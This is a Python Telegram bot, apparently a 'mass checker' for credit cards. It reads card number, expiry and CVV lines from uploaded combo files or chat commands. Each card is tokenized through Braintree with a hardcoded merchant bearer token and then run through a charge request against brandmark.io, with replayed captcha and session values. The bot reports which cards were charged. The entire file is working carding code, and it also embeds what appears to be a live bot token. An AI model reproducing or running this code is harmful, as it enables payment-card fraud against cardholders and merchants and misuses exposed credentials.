import os
import time
import asyncio
import requests
import aiofiles
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Global variables to track checking state and stats
checking_active = False
stats = {
    'approved': 0,
    'declined': 0,
    'checked': 0,
    'total': 0,
    'start_time': 0
}

# API function to tokenize a credit card using Braintree
def b3req(cc, mm, yy):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE4MDIzMjgsImp0aSI6IjdlY2EwNjU5LWM5ZjMtNDdhMC05N2ZkLWYzYmYzMGY1MThiOCIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.YpJMGo0xXfkdDMfGf2eR7FfqrVQaCUSnb9lBZ8RRIZfkczQQdt4bJYWLnJDUCpKyV1diI4zXa2dM9TIQr3_xzA',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '6db180be-6f9c-487d-a8a4-7525f3ffbb46',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{cc}',
                    'expirationMonth': f'{mm}',
                    'expirationYear': f'{yy}',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        resjson = response.json()
    except requests.exceptions.JSONDecodeError:
        return None, None, None, None, None, None, None
    if 'data' not in resjson or not resjson['data']:
        return None, None, None, None, None, None, None
    try:
        tkn = resjson['data']['tokenizeCreditCard']['token']
        mm = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationMonth"]
        yy = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationYear"]
        bin = resjson["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
        card_type = resjson["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
        lastfour = resjson["data"]["tokenizeCreditCard"]["creditCard"]["last4"]
        lasttwo = lastfour[-2:]
        return tkn, mm, yy, bin, card_type, lastfour, lasttwo
    except KeyError:
        return None, None, None, None, None, None, None

# API function to process a payment using Brandmark
def brainmarkreq(b3tkn, mm, yy, bin, Type, lastfour, lasttwo):
    cookies2 = {
        '_ga': 'GA1.2.491014848.1741511192',
        '_gid': 'GA1.2.1660947397.1741511192',
        '_gat': '1',
        '_ga_93VBC82KGM': 'GS1.2.1741511192.1.1.1741511482.0.0.0',
    }
    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.brandmark.io',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data2 = {
        'tier': 'basic',
        'email': 'ibbie91@freesourcecodes.com',
        'payload': {
            'nonce': f'{b3tkn}',
            'details': {
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'bin': f'{bin}',
                'cardType': f'{Type}',
                'lastFour': f'{lastfour}',
                'lastTwo': f'{lasttwo}',
            },
            'type': 'CreditCard',
            'description': 'ending in 78',
            'deviceData': '{"device_session_id":"2a85b029ae7572f2bff69785a1a394b5","fraud_merchant_id":null,"correlation_id":"a4458c29acd813238a3a22d87b4b75dc"}',
            'binData': {
                'prepaid': 'No',
                'healthcare': 'No',
                'debit': 'Yes',
                'durbinRegulated': 'Yes',
                'commercial': 'Unknown',
                'payroll': 'No',
                'issuingBank': 'JPMORGAN CHASE BANK N.A. - DEBIT',
                'countryOfIssuance': 'USA',
                'productId': 'F',
            },
        },
        'discount': False,
        'referral': None,
        'params': {
            'id': 'logo-f4f9ae2-9a3c-41e7-8ee4-70d6315c0bd0',
            'title': 'HIDMS SYSTEM',
        },
        'svg': '</svg>\n',
        'recaptcha_token': '03AFcWeA70OWBbi1SYHY7ksaHXvVAd4abJpV-AOPePveJV9IZ-lNvf4d7sfYIn3lTQS9BTSqo-On6TAOWM6py013K9dLMRG7bM2QOOF0ch2MtFUN6U1j7rM62VntETNXaC8PDyB5ZSl1thNM9yagGuWCYkLK4LfCFnCqtMus-faz3jw27-8fEJ6FxTmXvm1PJBcWgXhjbcreQdDP_qVTBIq0JYFI3XYH8PvVfEZ5YIgpTfjSnpB-uSeSKkkD-SKYzl4dNB3sJkqxzO54tID_x_AsDKss3L42BsGsEAeGxq0lsEmVuIh_U9_ges9bW8n9Mg7PfIkrVNMoPHoJ4zN72RYiDq7-9_56BqCHOjsYiOmQGaNkYvAbY6ps9liJpWDbBevz3Ldrbu8BbzNFgHMmuvwB5-tpJaTDLjApzCrUAvoSBU-tw7nWbJg3Oga43idcOtagTkZJNn23HN4-sVkJAPFV4_FAgyjUco1poULBCOrlhWNGGDlj2DSJlvlVD8v0dfuwlJKj4v4m8FksbdI9rhtR8itb2JbPkbGEpfvhbO35CvI2x5JpyA5TU3Gu0mXYFEDCydAo7PLt60vo4_eloQA7KBvTrcEet9qHP8hFQStz3qUOWh7zvgOwU_RB7e_66P3PKOM4Nr8VcA7peeU1ccblCeQGBa501tmfvJN9wj1bzhJlD3m_FOrKGTnmfP2T2Wrt09Hi0W0v4Pxbi-zNvTbxyRhEsUIpa7RceZedt1h-4rFq_Abngcl_DGB5380uR2GHW1LuQPtfYyC9bXNkRDNgFbSVtzzqzFqGcVUx73HuAeN44HrB-qW0XjcD-nCPwcbl_NXCUkbC8it9iB39lwDM_Onzvd5F9P3qPIq7VJkPunjD6trwK6tcXPmvmPrpzpuH_lrqQ6K-rauxAk7FWLGz_nYUEw3YVmfRI1u_zd6ldecHb-Objy57JlBckEjvNdRf_Ozx_gFVsc3DZz2LydSZ2nY-VVUJUoNFK7dGgvvsh_ExHDpb7SEki-WXIebbGenlmPVoB96bR3nTJlIBvtDuE7Xkm_H9c7DsOMCMouvTmEeq5TUw7G4hWmGTwm83lSJ1A8l3ZbZpxii5q8YtVKA0iFUBd4oSnjaiZ_t6VB-jlR3iw_sVDMvUjerEvPLVRYwT4A4mqwqJbpDU85bV86EVwCb245EAw616lZyyU7jeS4UoSD6sWzpAanIheRBsWnU2kW_rmML1M7RriXi9eMHoA11DSz1V1WL9J0pB1zlnvImViWEEaWCnNQa1spOzfL_xntPUtsaTWzssSKergHJfTLtqBroCfJq2oTL8pLVWQhJZXxiIKaCKZLHbg3_mE0XcgwlT0CwepXE0Ti06MaK3tylPNmMi5yPs1g7ToIimdLLJx4LgQwktR85cDmagspIVSP_cRbcpTtgXhfPfc-dLw35sLldHB6Mjmy5eUaxuleNEFlEHN4DCw3Yci-rUAdtjiC-kER7CNUWSiDjTk7JA6Li1nFeUIMubCy74-u9WxYqi2CK8uMjW9Qm4OJMhTWorLO5s5M3EFXZZObGfwjSaBhyqFj3S9Va4IwzGIo0WnyuX7VGiCYNzXCR-Cfn4gBmG1ETQdQgY4pPpeScBBmmi6yWAqyivIVaMXiey9ai0gy09MGiVR73D0drSrzodrguA_B47Xd_hJE-_1d5Vpt_Y8ScnpftyhRPztLE2HFiDiOaSYiJqNJW2RAKg3R48-QhlOFpcG5M084oqIlMaXausjTvhhEinYxW_5mYIG2JkjeaVltHFQiSmkqnY-WWBJ_XAi6fjZto_Me-DFsOK1r3Fu3OnefaQq5NGYJqvndwkUxr4WuzEGJy3AxjZbUlpF1mqtZ9PI-Q6WJvfsoNol8tDdgqgVCdC0UN8K7XU5y5rXDMCauftH74mHEArP5EdUMz8VOP_vPI7eCtN_LhZCpzVcK5VvOV4ghlwuN_Vr7IIiVYaWMsud1j8OBes3rAPQulZTStYIqOx004oEA1Uwjs_LDapv6tWyTtYdg3LOshD-VSWzkr5FQzN9NkCOFPC8R8zqE3mb2tKvHhjk1FpkoveP1DKv-r-S8qkItpYRevwTENG4R9kL6FhgzURG_j9KCkwqKxR2t1yZ6vvbTxcHidTcXQFCuo55HiOTlSthc9dVO3P8l4EZB3UJ_K1PHaWl-bmJiRzlNTnK-UJtjK7FNcG5Eu8DaBH2O_uumqwUj2ZXYomxDhmBSj0VZZtnjuO2s0erl9GjcnWv8HDCS9YQ2qfEA6XhiL7Wm2SAqu_eIgtXXa_QyHPV7I-E',
        'token': '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',
    }
    response2 = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies2, headers=headers2, json=json_data2)
    try:
        res2json = response2.json()
        return res2json['message']
    except (requests.exceptions.JSONDecodeError, KeyError):
        return "Error: Invalid API response"

# Helper function to run synchronous functions in an async context
async def run_sync_func(func, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, func, *args)

# Check if a card was successfully charged based on the API response
def is_charged(message):
    return "success" in message.lower()

# Process a text file containing card details
async def process_file(file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = 0
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0

    # Read all lines from the file
    lines = []
    async with aiofiles.open(file_path, 'r') as f:
        async for line in f:
            lines.append(line.strip())
    stats['total'] = len(lines)
    if stats['total'] == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="File is empty!")
        checking_active = False
        return

    for line in lines:
        if not checking_active:
            break
        if '|' not in line or len(line.split('|')) != 4:
            continue
        card_number, expiry_month, expiry_year, _ = line.split('|')
        tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
        if tkn is None:
            continue
        final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
        stats['checked'] += 1
        if is_charged(final):
            stats['approved'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
        else:
            stats['declined'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"{final} {card_number}")

        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')
    
    checking_active = False

# Handle document uploads (text files with card details)
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("Please send a .txt file.")
        return
    file = await document.get_file()
    os.makedirs('temp', exist_ok=True)
    file_path = os.path.join('temp', document.file_name)
    await file.download_to_drive(file_path)
    await update.message.reply_text("✅ File received! Starting checking...\n⚡ Progress will be updated every 50 cards")
    await process_file(file_path, update, context)

# Handle /chk command for checking a single card
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /chk <cc|mm|yy|cvv>")
        return
    cc_input = context.args[0]
    if '|' not in cc_input or len(cc_input.split('|')) != 4:
        await update.message.reply_text("Invalid format. Use: /chk cc|mm|yy|cvv")
        return
    card_number, expiry_month, expiry_year, _ = cc_input.split('|')
    tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
    if tkn is None:
        await update.message.reply_text("Error processing card.")
        return
    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
    if is_charged(final):
        await update.message.reply_text(f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"{final} {card_number}")

# Handle /mchk command for checking multiple cards
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active, stats
    message_text = update.message.text
    lines = message_text.split('\n')[1:]  # Skip the /mchk line
    if not lines:
        await update.message.reply_text("Usage: /mchk\n<cc1|mm|yy|cvv>\n<cc2|mm|yy|cvv>...")
        return
    checking_active = True
    stats['start_time'] = time.time()
    stats['total'] = len(lines)
    stats['checked'] = 0
    stats['approved'] = 0
    stats['declined'] = 0

    for line in lines:
        if not checking_active:
            break
        line = line.strip()
        if not line or '|' not in line or len(line.split('|')) != 4:
            continue
        card_number, expiry_month, expiry_year, _ = line.split('|')
        tkn, mm, yy, bin, card_type, lastfour, lasttwo = await run_sync_func(b3req, card_number, expiry_month, expiry_year)
        if tkn is None:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error processing {card_number}")
            continue
        final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo)
        stats['checked'] += 1
        if is_charged(final):
            stats['approved'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"<b>Charged✅</b> {card_number}", parse_mode='HTML')
        else:
            stats['declined'] += 1
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"{final} {card_number}")

        if stats['checked'] % 50 == 0 or stats['checked'] == stats['total']:
            duration = time.time() - stats['start_time']
            avg_speed = stats['checked'] / duration if duration > 0 else 0
            success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> {stats['approved']}
<b>[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> {stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {stats['checked']}/{stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=update.effective_chat.id, text=progress_message, parse_mode='HTML')
    
    checking_active = False

# Handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📤 Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("⏹️ Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("📊 Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("? Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Welcome To FN MASS CHR BOT! 🔥\n"
        "🔍 Use /chk To Check Single CC\n"
        "📤 Send Combo File Or Else Use Button Below:",
        reply_markup=reply_markup
    )

# Handle button clicks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    query = update.callback_query
    await query.answer()

    if query.data == 'upload_combo':
        await query.edit_message_text("📤 Please upload your combo file (.txt)")
    elif query.data == 'cancel_check':
        checking_active = False
        await query.edit_message_text("⏹️ Checking cancelled!🛑")
    elif query.data == 'live_stats':
        duration = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
        avg_speed = stats['checked'] / duration if duration > 0 else 0
        success_rate = (stats['approved'] / stats['checked'] * 100) if stats['checked'] > 0 else 0
        stats_message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {stats['total']} 
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━
"""
        await query.edit_message_text(stats_message)
    elif query.data == 'help':
        await query.edit_message_text("Help: Use /chk <cc|mm|yy|cvv> for single check or upload a .txt file with combos.")

# Handle /stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking_active
    checking_active = False
    await update.message.reply_text("⏹️ Process Stopped!🛑")

# Main bot setup and execution
if __name__ == '__main__':
    app = ApplicationBuilder().token('7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs').build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Command(), start))  # Fallback for commands
    app.add_handler(CallbackQueryHandler(button))
    app.run_polling()